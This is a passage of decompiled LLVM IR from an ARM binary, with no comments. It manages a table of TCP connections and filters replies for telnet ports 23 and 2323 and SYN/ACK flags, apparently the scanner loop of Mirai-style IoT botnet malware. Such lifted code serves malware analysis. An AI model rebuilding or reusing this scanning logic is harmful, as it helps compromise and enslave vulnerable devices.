  store i32 %v2_e86c, i32* %r3.global-to-local, align 4
  %v3_e870 = icmp uge i32 %v3_e868, %v2_e86c
  store i1 %v3_e870, i1* %cpsr_c.global-to-local, align 1
  %v9_e870 = icmp eq i32 %v3_e868, %v2_e86c
  store i1 %v9_e870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e870, label %dec_label_pc_e878, label %dec_label_pc_e818

dec_label_pc_e878:                                ; preds = %dec_label_pc_e860
  store i32 %v2_e4e8, i32* @lr, align 4
  %v3_e87c = load i8, i8* %v2_e87c, align 1
  %v4_e87c = zext i8 %v3_e87c to i32
  store i32 %v4_e87c, i32* %r3.global-to-local, align 4
  %v2_e880 = icmp ugt i8 %v3_e87c, 5
  store i1 %v2_e880, i1* %cpsr_c.global-to-local, align 1
  %v7_e880 = icmp eq i8 %v3_e87c, 6
  store i1 %v7_e880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e880, label %dec_label_pc_e888, label %dec_label_pc_e818

dec_label_pc_e888:                                ; preds = %dec_label_pc_e878
  %v0_e888 = load i32, i32* @r4, align 4
  %v1_e888 = inttoptr i32 %v0_e888 to i16*
  %v2_e888 = load i16, i16* %v1_e888, align 2
  %v3_e888 = zext i16 %v2_e888 to i32
  store i32 %v3_e888, i32* %ip.global-to-local, align 4
  %v2_e88c = icmp ugt i16 %v2_e888, 5887
  store i1 %v2_e88c, i1* %cpsr_c.global-to-local, align 1
  %v7_e88c = icmp eq i16 %v2_e888, 5888
  store i1 %v7_e88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e88c, label %dec_label_pc_e8a4, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e888
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_e89c = icmp ugt i16 %v2_e888, 4872
  store i1 %v3_e89c, i1* %cpsr_c.global-to-local, align 1
  %v9_e89c = icmp eq i16 %v2_e888, 4873
  store i1 %v9_e89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e89c, label %dec_label_pc_e8a4, label %dec_label_pc_e818

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e894, %dec_label_pc_e888
  %v1_e8a4 = add i32 %v0_e888, 2
  %v2_e8a4 = inttoptr i32 %v1_e8a4 to i16*
  %v3_e8a4 = load i16, i16* %v2_e8a4, align 2
  %v4_e8a4 = zext i16 %v3_e8a4 to i32
  store i32 %v4_e8a4, i32* %r3.global-to-local, align 4
  store i32 %v4_e3b8, i32* %r0.global-to-local, align 4
  %v3_e8ac = icmp uge i32 %v4_e8a4, %v4_e3b8
  store i1 %v3_e8ac, i1* %cpsr_c.global-to-local, align 1
  %v9_e8ac = icmp eq i32 %v4_e8a4, %v4_e3b8
  store i1 %v9_e8ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e8ac, label %dec_label_pc_e8b4, label %dec_label_pc_e818

dec_label_pc_e8b4:                                ; preds = %dec_label_pc_e8a4
  %v1_e8b4 = add i32 %v0_e888, 13
  %v2_e8b4 = inttoptr i32 %v1_e8b4 to i8*
  %v3_e8b4 = load i8, i8* %v2_e8b4, align 1
  %v4_e8b4 = zext i8 %v3_e8b4 to i32
  store i32 %v4_e8b4, i32* %r3.global-to-local, align 4
  %v1_e8b8 = and i32 %v4_e8b4, 2
  %v2_e8b8 = icmp eq i32 %v1_e8b8, 0
  store i1 %v2_e8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b8, label %dec_label_pc_e818, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e8b4
  %v1_e8c0 = and i32 %v4_e8b4, 16
  %v2_e8c0 = icmp eq i32 %v1_e8c0, 0
  store i1 %v2_e8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8c0, label %dec_label_pc_e818, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8c0
  %v1_e8c8 = and i32 %v4_e8b4, 4
  %v2_e8c8 = icmp eq i32 %v1_e8c8, 0
  store i1 %v2_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8c8, label %dec_label_pc_e8d0, label %dec_label_pc_e818

dec_label_pc_e8d0:                                ; preds = %dec_label_pc_e8c8
  %tmp = urem i8 %v3_e8b4, 2
  %v2_e8d0 = icmp eq i8 %tmp, 0
  store i1 %v2_e8d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8d0, label %dec_label_pc_e8d8, label %dec_label_pc_e818

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e8d0
  %v1_e8d8 = add i32 %v0_e888, 8
  %v2_e8d8 = inttoptr i32 %v1_e8d8 to i32*
  %v3_e8d8 = load i32, i32* %v2_e8d8, align 4
  %v3_e8e0 = udiv i32 %v3_e8d8, 16777216
  %v1_e8e4 = and i32 %v3_e8d8, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v1_e8dc = udiv i32 %v3_e8d8, 256
  %v4_e8e8 = and i32 %v1_e8dc, 65280
  %v4_e8ec = mul i32 %v1_e8e4, 256
  %v4_e8f0 = mul i32 %v3_e8d8, 16777216
  %v5_e8e8 = or i32 %v4_e8f0, %v3_e8e0
  %v5_e8ec = or i32 %v5_e8e8, %v4_e8e8
  %v5_e8f0 = or i32 %v5_e8ec, %v4_e8ec
  %v1_e8f4 = add i32 %v5_e8f0, -1
  store i32 %v1_e8f4, i32* %r2.global-to-local, align 4
  %v1_e8f8 = and i32 %v1_e8f4, 16711680
  store i32 %v1_e8f8, i32* %r0.global-to-local, align 4
  %v3_e8fc = udiv i32 %v1_e8f4, 16777216
  %v4_e904 = udiv i32 %v1_e8f8, 256
  %v5_e904 = or i32 %v4_e904, %v3_e8fc
  %v1_e900 = mul i32 %v1_e8f4, 256
  %v4_e908 = and i32 %v1_e900, 16711680
  %v5_e908 = or i32 %v5_e904, %v4_e908
  store i32 %v5_e908, i32* %r3.global-to-local, align 4
  store i32 %v2_e4e8, i32* %r1.global-to-local, align 4
  %v3_e910 = load i32, i32* %v2_e910, align 4
  store i32 %v3_e910, i32* @lr, align 4
  %v5_e914 = call i32 @llvm.bswap.i32(i32 %v1_e8f4)
  store i32 %v5_e914, i32* %r3.global-to-local, align 4
  %v3_e918 = icmp uge i32 %v5_e914, %v3_e910
  store i1 %v3_e918, i1* %cpsr_c.global-to-local, align 1
  %v9_e918 = icmp eq i32 %v5_e914, %v3_e910
  store i1 %v9_e918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e918, label %dec_label_pc_e920, label %dec_label_pc_e818

dec_label_pc_e920:                                ; preds = %dec_label_pc_e8d8
  %v0_e920 = load i32, i32* @r5, align 4
  %v2_e920 = icmp ugt i32 %v0_e920, 254
  store i1 %v2_e920, i1* %cpsr_c.global-to-local, align 1
  %v7_e920 = icmp eq i32 %v0_e920, 255
  store i1 %v7_e920, i1* %cpsr_z.global-to-local, align 1
  %v8_e924 = icmp sgt i32 %v0_e920, 255
  br i1 %v8_e924, label %dec_label_pc_e9a0, label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e920
  %v2_e930 = load i32, i32* @global_var_2420c.145, align 4
  store i32 %v2_e930, i32* %r1.global-to-local, align 4
  %v3_e934 = mul i32 %v0_e920, 256
  store i32 %v3_e934, i32* %r2.global-to-local, align 4
  %v2_e938 = mul i32 %v0_e920, 288
  store i32 %v2_e938, i32* %r3.global-to-local, align 4
  %v2_e93c = add i32 %v2_e930, %v2_e938
  store i32 %v2_e93c, i32* @r0, align 4
  %v1_e940 = add i32 %v2_e93c, 12
  %v2_e940 = inttoptr i32 %v1_e940 to i32*
  %v3_e940 = load i32, i32* %v2_e940, align 4
  store i32 %v3_e940, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e944 = icmp eq i32 %v3_e940, 0
  store i1 %v2_e944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e944, label %dec_label_pc_e988, label %dec_label_pc_e964.preheader

dec_label_pc_e964.preheader:                      ; preds = %dec_label_pc_e928
  %v2_e948 = add i32 %v0_e920, 1
  %v2_e950 = and i32 %v2_e948, 134217728
  %v3_e950 = icmp ne i32 %v2_e950, 0
  store i1 %v3_e950, i1* %cpsr_c.global-to-local, align 1
  %v3_e954 = mul i32 %v2_e948, 288
  %v3_e958 = add i32 %v2_e930, %v3_e954
  store i32 %v3_e958, i32* %r3.global-to-local, align 4
  store i32 %v0_e920, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %dec_label_pc_e964.preheader, %dec_label_pc_e970
  %v0_e970 = phi i32 [ %v3_e958, %dec_label_pc_e964.preheader ], [ %v1_e97c, %dec_label_pc_e970 ]
  %v0_e964 = phi i32 [ %v0_e920, %dec_label_pc_e964.preheader ], [ %v1_e964, %dec_label_pc_e970 ]
  %v1_e964 = add i32 %v0_e964, 1
  store i32 %v1_e964, i32* %r2.global-to-local, align 4
  %v7_e968 = icmp eq i32 %v1_e964, 256
  br i1 %v7_e968, label %dec_label_pc_e9a0.loopexit, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %dec_label_pc_e964
  store i32 %v0_e970, i32* @r0, align 4
  %v1_e974 = add i32 %v0_e970, 12
  %v2_e974 = inttoptr i32 %v1_e974 to i32*
  %v3_e974 = load i32, i32* %v2_e974, align 4
  %v2_e978 = icmp eq i32 %v3_e974, 0
  %v1_e97c = add i32 %v0_e970, 288
  store i32 %v1_e97c, i32* %r3.global-to-local, align 4
  br i1 %v2_e978, label %dec_label_pc_e984, label %dec_label_pc_e964

dec_label_pc_e984:                                ; preds = %dec_label_pc_e970
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e964, i32* @r5, align 4
  br label %dec_label_pc_e988

dec_label_pc_e988:                                ; preds = %dec_label_pc_e928, %dec_label_pc_e984
  %v1_e990 = phi i32 [ %v2_e93c, %dec_label_pc_e928 ], [ %v0_e970, %dec_label_pc_e984 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e988 = icmp eq i32 %v1_e990, 0
  store i1 %v2_e988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e988, label %dec_label_pc_e9a0, label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e988
  %v2_e990 = add i32 %v1_e990, 16
  %v3_e990 = inttoptr i32 %v2_e990 to i32*
  store i32 %v3_e910, i32* %v3_e990, align 4
  %v0_e994 = load i32, i32* %ip.global-to-local, align 4
  %v1_e994 = trunc i32 %v0_e994 to i16
  %v2_e994 = load i32, i32* @r0, align 4
  %v3_e994 = add i32 %v2_e994, 20
  %v4_e994 = inttoptr i32 %v3_e994 to i16*
  store i16 %v1_e994, i16* %v4_e994, align 2
  %v0_e998 = call i32 @setup_connection()
  store i32 %v0_e998, i32* %r0.global-to-local, align 4
  %v1_e81c.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_e818

dec_label_pc_e9a0.loopexit:                       ; preds = %dec_label_pc_e964
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9a0

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e988, %dec_label_pc_e920, %dec_label_pc_e84c, %dec_label_pc_e818, %dec_label_pc_e9a0.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_e9c0511 = load i32, i32* @sp, align 4
  %v3_e9c0512 = add i32 %v2_e9c0511, 1676
  %v4_e9c0513 = inttoptr i32 %v3_e9c0512 to i32*
  store i32 0, i32* %v4_e9c0513, align 4
  br label %dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge

dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge:    ; preds = %dec_label_pc_e9a0, %dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge
  %v0_e9ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e9b0 = add i32 %v0_e9ac.pre, 4
  store i32 %v1_e9b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e9b8 = add i32 %v0_e9ac.pre, 1672
  store i32 %v1_e9b8, i32* %ip.global-to-local, align 4
  %v7_e9bc = icmp eq i32 %v1_e9b0, 128
  %v2_e9c0 = load i32, i32* @sp, align 4
  %v3_e9c0 = add i32 %v2_e9c0, %v1_e9b8
  %v4_e9c0 = inttoptr i32 %v3_e9c0 to i32*
  store i32 0, i32* %v4_e9c0, align 4
  br i1 %v7_e9bc, label %dec_label_pc_e9c8, label %dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e9c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e9c8, i32* %stack_var_-352, align 4
  %v1_e9d4514 = add i32 %v0_e9c8, 8
  store i32 %v1_e9d4514, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_e9dc515 = add i32 %v0_e9c8, 1548
  store i32 %v1_e9dc515, i32* @lr, align 4
  %v7_e9e0516 = icmp eq i32 %v1_e9d4514, 128
  %v2_e9e4517 = load i32, i32* @sp, align 4
  %v3_e9e4518 = add i32 %v2_e9e4517, %v1_e9dc515
  %v4_e9e4519 = inttoptr i32 %v3_e9e4518 to i32*
  store i32 0, i32* %v4_e9e4519, align 4
  br i1 %v7_e9e0516, label %dec_label_pc_e9ec, label %dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge

dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge:    ; preds = %dec_label_pc_e9c8, %dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge
  %v0_e9d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_e9d4 = add i32 %v0_e9d0.pre, 4
  store i32 %v1_e9d4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_e9dc = add i32 %v0_e9d0.pre, 1544
  store i32 %v1_e9dc, i32* @lr, align 4
  %v7_e9e0 = icmp eq i32 %v1_e9d4, 128
  %v2_e9e4 = load i32, i32* @sp, align 4
  %v3_e9e4 = add i32 %v2_e9e4, %v1_e9dc
  %v4_e9e4 = inttoptr i32 %v3_e9e4 to i32*
  store i32 0, i32* %v4_e9e4, align 4
  br i1 %v7_e9e0, label %dec_label_pc_e9ec, label %dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge, %dec_label_pc_e9c8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e9ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e9ec, i32* @r6, align 4
  store i32 %v0_e9ec, i32* @r5, align 4
  store i32 %v0_e9ec, i32* %stack_var_-52, align 4
  br label %dec_label_pc_ea48

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_ea78
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ea64, i1* %cpsr_z.global-to-local, align 1
  %v1_eae8 = add i32 %v2_ea5c, 4
  %v2_eae8 = inttoptr i32 %v1_eae8 to i32*
  %v3_eae8 = load i32, i32* %v2_eae8, align 4
  br i1 %v7_ea64, label %dec_label_pc_eae8, label %dec_label_pc_ea04

dec_label_pc_ea04:                                ; preds = %dec_label_pc_e9fc
  store i32 %v3_eae8, i32* %ip.global-to-local, align 4
  %v3_ea08 = udiv i32 %v3_eae8, 32
  store i32 %v2_eaf4, i32* %r0.global-to-local, align 4
  %v3_ea10 = mul nuw nsw i32 %v3_ea08, 4
  %v2_ea14 = add i32 %v3_ea10, %v2_eaf4
  store i32 %v2_ea14, i32* %r3.global-to-local, align 4
  %v1_ea18 = add i32 %v2_ea14, -184
  %v2_ea18 = inttoptr i32 %v1_ea18 to i32*
  %v3_ea18 = load i32, i32* %v2_ea18, align 4
  %v1_ea1c = urem i32 %v3_eae8, 32
  store i32 %v1_ea1c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_ea24 = shl i32 1, %v1_ea1c
  %v8_ea24 = or i32 %v3_ea18, %v7_ea24
  store i32 %v8_ea24, i32* %r2.global-to-local, align 4
  store i32 %v8_ea24, i32* %v2_ea18, align 4
  %v0_ea2c = load i32, i32* @r6, align 4
  %v1_ea2c = load i32, i32* %ip.global-to-local, align 4
  %v3_ea2c = icmp uge i32 %v0_ea2c, %v1_ea2c
  store i1 %v3_ea2c, i1* %cpsr_c.global-to-local, align 1
  %v9_ea2c = icmp eq i32 %v0_ea2c, %v1_ea2c
  store i1 %v9_ea2c, i1* %cpsr_z.global-to-local, align 1
  %v5_ea30 = icmp slt i32 %v0_ea2c, %v1_ea2c
  br i1 %v5_ea30, label %bb407, label %bb408

bb407:                                            ; preds = %dec_label_pc_ea04
  store i32 %v1_ea2c, i32* @r6, align 4
  br label %bb408

bb408:                                            ; preds = %.thread75, %bb414, %bb412, %bb416, %dec_label_pc_eadc, %dec_label_pc_ea04, %bb407
  %v3_ea34 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ea34, i32* %r3.global-to-local, align 4
  %v1_ea38 = add i32 %v3_ea34, 1
  store i32 %v1_ea38, i32* %r2.global-to-local, align 4
  %v2_ea3c = icmp ugt i32 %v1_ea38, 254
  store i1 %v2_ea3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea3c = icmp eq i32 %v1_ea38, 255
  store i1 %v7_ea3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ea38, i32* %stack_var_-52, align 4
  %v8_ea44 = icmp sgt i32 %v1_ea38, 255
  br i1 %v8_ea44, label %dec_label_pc_eb18, label %dec_label_pc_ea48

dec_label_pc_ea48:                                ; preds = %bb408, %dec_label_pc_e9ec
  %v0_ea54 = phi i32 [ %v1_ea38, %bb408 ], [ %v0_e9ec, %dec_label_pc_e9ec ]
  store i32 ptrtoint (i32* @global_var_2420c.145 to i32), i32* %r0.global-to-local, align 4
  %v3_ea4c = mul i32 %v0_ea54, 256
  store i32 %v3_ea4c, i32* %r3.global-to-local, align 4
  %v2_ea50 = load i32, i32* @global_var_2420c.145, align 4
  store i32 %v2_ea50, i32* @r1, align 4
  %v2_ea58 = mul i32 %v0_ea54, 288
  store i32 %v2_ea58, i32* %r2.global-to-local, align 4
  %v2_ea5c = add i32 %v2_ea50, %v2_ea58
  store i32 %v2_ea5c, i32* @r4, align 4
  %v1_ea60 = add i32 %v2_ea5c, 12
  %v2_ea60 = inttoptr i32 %v1_ea60 to i32*
  %v3_ea60 = load i32, i32* %v2_ea60, align 4
  store i32 %v3_ea60, i32* %ip.global-to-local, align 4
  %v2_ea64 = icmp ne i32 %v3_ea60, 0
  store i1 %v2_ea64, i1* %cpsr_c.global-to-local, align 1
  %v7_ea64 = icmp eq i32 %v3_ea60, 1
  store i1 %v7_ea64, i1* %cpsr_z.global-to-local, align 1
  %v2_ea68 = xor i1 %v2_ea64, true
  %v3_ea68 = or i1 %v7_ea64, %v2_ea68
  br i1 %v3_ea68, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_ea48
  store i32 5, i32* @r1, align 4
  br label %bb410

bb410:                                            ; preds = %dec_label_pc_ea48, %bb409
  %v1_ea88215 = phi i32 [ %v2_ea50, %dec_label_pc_ea48 ], [ 5, %bb409 ]
  %v2_ea6c = xor i1 %v7_ea64, true
  %v3_ea6c = and i1 %v2_ea64, %v2_ea6c
  br i1 %v3_ea6c, label %bb411, label %bb412

bb411:                                            ; preds = %bb410
  store i32 30, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %bb410, %bb411
  %v1_ea88 = phi i32 [ %v1_ea88215, %bb410 ], [ 30, %bb411 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea70 = icmp eq i32 %v3_ea60, 0
  store i1 %v2_ea70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea70, label %bb408, label %dec_label_pc_ea78

dec_label_pc_ea78:                                ; preds = %bb412
  store i32 ptrtoint (i32* @global_var_21728.133 to i32), i32* %r2.global-to-local, align 4
  %v2_ea7c = load i32, i32* @global_var_21728.133, align 4
  store i32 %v2_ea7c, i32* %r3.global-to-local, align 4
  %v1_ea80 = add i32 %v2_ea5c, 8
  %v2_ea80 = inttoptr i32 %v1_ea80 to i32*
  %v3_ea80 = load i32, i32* %v2_ea80, align 4
  store i32 %v3_ea80, i32* %r2.global-to-local, align 4
  %v2_ea84 = sub i32 %v2_ea7c, %v3_ea80
  store i32 %v2_ea84, i32* %r3.global-to-local, align 4
  %v3_ea88 = icmp uge i32 %v2_ea84, %v1_ea88
  store i1 %v3_ea88, i1* %cpsr_c.global-to-local, align 1
  %v9_ea88 = icmp eq i32 %v2_ea84, %v1_ea88
  store i1 %v9_ea88, i1* %cpsr_z.global-to-local, align 1
  %v2_ea8c = xor i1 %v3_ea88, true
  %v3_ea8c = or i1 %v9_ea88, %v2_ea8c
  br i1 %v3_ea8c, label %dec_label_pc_e9fc, label %dec_label_pc_ea90

dec_label_pc_ea90:                                ; preds = %dec_label_pc_ea78
  %v1_ea90 = add i32 %v2_ea5c, 4
  %v2_ea90 = inttoptr i32 %v1_ea90 to i32*
  %v3_ea90 = load i32, i32* %v2_ea90, align 4
  store i32 %v3_ea90, i32* %r0.global-to-local, align 4
  %v1_ea94 = call i32 @__GI___libc_close(i32 %v3_ea90)
  store i32 %v1_ea94, i32* %r0.global-to-local, align 4
  %v0_ea98 = load i32, i32* @r4, align 4
  %v1_ea98 = add i32 %v0_ea98, 12
  %v2_ea98 = inttoptr i32 %v1_ea98 to i32*
  %v3_ea98 = load i32, i32* %v2_ea98, align 4
  store i32 %v3_ea98, i32* %r3.global-to-local, align 4
  %v2_ea9c = icmp ugt i32 %v3_ea98, 1
  store i1 %v2_ea9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea9c = icmp eq i32 %v3_ea98, 2
  store i1 %v7_ea9c, i1* %cpsr_z.global-to-local, align 1
  %v2_eaa0 = xor i1 %v2_ea9c, true
  %v3_eaa0 = or i1 %v7_ea9c, %v2_eaa0
  br i1 %v3_eaa0, label %bb413, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_ea90
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_eaa8298302 = add i32 %v0_ea98, 4
  %v3_eaa8299303 = inttoptr i32 %v2_eaa8298302 to i32*
  store i32 -1, i32* %v3_eaa8299303, align 4
  br label %bb414

bb413:                                            ; preds = %dec_label_pc_ea90
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_eaa8295 = add i32 %v0_ea98, 4
  %v3_eaa8296 = inttoptr i32 %v2_eaa8295 to i32*
  store i32 -1, i32* %v3_eaa8296, align 4
  %v4_eaac = load i32, i32* %r3.global-to-local, align 4
  %v5_eaac = load i32, i32* @r4, align 4
  %v6_eaac = add i32 %v5_eaac, 12
  %v7_eaac = inttoptr i32 %v6_eaac to i32*
  store i32 %v4_eaac, i32* %v7_eaac, align 4
  %v4_eab0 = load i32, i32* %r3.global-to-local, align 4
  %v5_eab0 = trunc i32 %v4_eab0 to i8
  %v6_eab0 = load i32, i32* @r4, align 4
  %v7_eab0 = add i32 %v6_eab0, 284
  %v8_eab0 = inttoptr i32 %v7_eab0 to i8*
  store i8 %v5_eab0, i8* %v8_eab0, align 1
  %v0_eab4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_eab4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb414

bb414:                                            ; preds = %.thread301, %bb413
  %v1_eab4 = phi i1 [ %v1_eab4.pre, %bb413 ], [ %v2_ea9c, %.thread301 ]
  %v0_eab4 = phi i1 [ %v0_eab4.pre, %bb413 ], [ false, %.thread301 ]
  %v2_eab4 = xor i1 %v1_eab4, true
  %v3_eab4 = or i1 %v0_eab4, %v2_eab4
  br i1 %v3_eab4, label %bb408, label %dec_label_pc_eab8

dec_label_pc_eab8:                                ; preds = %bb414
  %v0_eab8 = load i32, i32* @r4, align 4
  %v1_eab8 = add i32 %v0_eab8, 284
  %v2_eab8 = inttoptr i32 %v1_eab8 to i8*
  %v3_eab8 = load i8, i8* %v2_eab8, align 1
  %v4_eab8 = zext i8 %v3_eab8 to i32
  %v1_eabc = add nuw nsw i32 %v4_eab8, 1
  %v1_eac0 = urem i32 %v1_eabc, 256
  store i32 %v1_eac0, i32* %r3.global-to-local, align 4
  %v2_eac4 = icmp ugt i32 %v1_eac0, 9
  store i1 %v2_eac4, i1* %cpsr_c.global-to-local, align 1
  %v7_eac4 = icmp eq i32 %v1_eac0, 10
  store i1 %v7_eac4, i1* %cpsr_z.global-to-local, align 1
  %v1_eac8 = trunc i32 %v1_eabc to i8
  store i8 %v1_eac8, i8* %v2_eab8, align 1
  %v0_eacc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eacc, label %.thread75, label %dec_label_pc_eadc

.thread75:                                        ; preds = %dec_label_pc_eab8
  %v1_eacc = load i32, i32* %r3.global-to-local, align 4
  %v2_eacc = add i32 %v1_eacc, -10
  store i32 %v2_eacc, i32* %r3.global-to-local, align 4
  %v2_ead0 = load i32, i32* @r4, align 4
  %v3_ead0 = add i32 %v2_ead0, 12
  %v4_ead0 = inttoptr i32 %v3_ead0 to i32*
  store i32 %v2_eacc, i32* %v4_ead0, align 4
  %v1_ead4 = load i32, i32* %r3.global-to-local, align 4
  %v2_ead4 = trunc i32 %v1_ead4 to i8
  %v3_ead4 = load i32, i32* @r4, align 4
  %v4_ead4 = add i32 %v3_ead4, 284
  %v5_ead4 = inttoptr i32 %v4_ead4 to i8*
  store i8 %v2_ead4, i8* %v5_ead4, align 1
  %v0_ead8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ead8.pr.pr, label %bb408, label %dec_label_pc_eadc

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eab8, %.thread75
  %v0_eadc = load i32, i32* @r4, align 4
  store i32 %v0_eadc, i32* @r0, align 4
  %v0_eae0 = call i32 @setup_connection()
  store i32 %v0_eae0, i32* %r0.global-to-local, align 4
  br label %bb408

dec_label_pc_eae8:                                ; preds = %dec_label_pc_e9fc
  store i32 %v3_eae8, i32* %r0.global-to-local, align 4
  %v3_eaec = udiv i32 %v3_eae8, 32
  %v3_eaf0 = mul nuw nsw i32 %v3_eaec, 4
  store i32 %v2_eaf4, i32* @lr, align 4
  %v2_eaf8 = add i32 %v3_eaf0, %v2_eaf4
  store i32 %v2_eaf8, i32* %r3.global-to-local, align 4
  %v1_eafc = add i32 %v2_eaf8, -312
  %v2_eafc = inttoptr i32 %v1_eafc to i32*
  %v3_eafc = load i32, i32* %v2_eafc, align 4
  %v1_eb00 = urem i32 %v3_eae8, 32
  store i32 %v1_eb00, i32* %r1.global-to-local, align 4
  %v7_eb04 = shl i32 1, %v1_eb00
  %v8_eb04 = or i32 %v3_eafc, %v7_eb04
  store i32 %v8_eb04, i32* %r2.global-to-local, align 4
  %v0_eb08 = load i32, i32* @r5, align 4
  %v3_eb08 = icmp uge i32 %v0_eb08, %v3_eae8
  store i1 %v3_eb08, i1* %cpsr_c.global-to-local, align 1
  %v9_eb08 = icmp eq i32 %v0_eb08, %v3_eae8
  store i1 %v9_eb08, i1* %cpsr_z.global-to-local, align 1
  %v5_eb0c = icmp slt i32 %v0_eb08, %v3_eae8
  br i1 %v5_eb0c, label %bb415, label %bb416

bb415:                                            ; preds = %dec_label_pc_eae8
  store i32 %v3_eae8, i32* @r5, align 4
  br label %bb416

bb416:                                            ; preds = %dec_label_pc_eae8, %bb415
  store i32 %v8_eb04, i32* %v2_eafc, align 4
  br label %bb408

dec_label_pc_eb18:                                ; preds = %bb408
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_eb24 = load i32, i32* @r5, align 4
  %v1_eb24 = load i32, i32* @r6, align 4
  %v3_eb24 = icmp uge i32 %v0_eb24, %v1_eb24
  store i1 %v3_eb24, i1* %cpsr_c.global-to-local, align 1
  %v9_eb24 = icmp eq i32 %v0_eb24, %v1_eb24
  store i1 %v9_eb24, i1* %cpsr_z.global-to-local, align 1
  %v5_eb28 = icmp slt i32 %v0_eb24, %v1_eb24
  %storemerge155 = select i1 %v5_eb28, i32 %v1_eb24, i32 %v0_eb24
  store i32 %v2_eb3c, i32* %ip.global-to-local, align 4
  store i32 %v2_eb40, i32* %r1.global-to-local, align 4
  store i32 %v2_eb44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eb4c = add i32 %storemerge155, 1
  store i32 %v1_eb4c, i32* %r0.global-to-local, align 4
  %v5_eb58 = call i32 @__libc_select(i32 %v1_eb4c, i32 %v2_eb40, i32 %v2_eb44, i32 0, i32 %v2_eb3c)
  %v0_eb5c = load i32, i32* @r4, align 4
  store i32 %v0_eb5c, i32* %r0.global-to-local, align 4
  %v1_eb60 = inttoptr i32 %v0_eb5c to i32*
  %v2_eb60 = call i32 @__GI_time(i32* %v1_eb60)
  store i32 %v2_eb60, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21728.133 to i32), i32* @lr, align 4
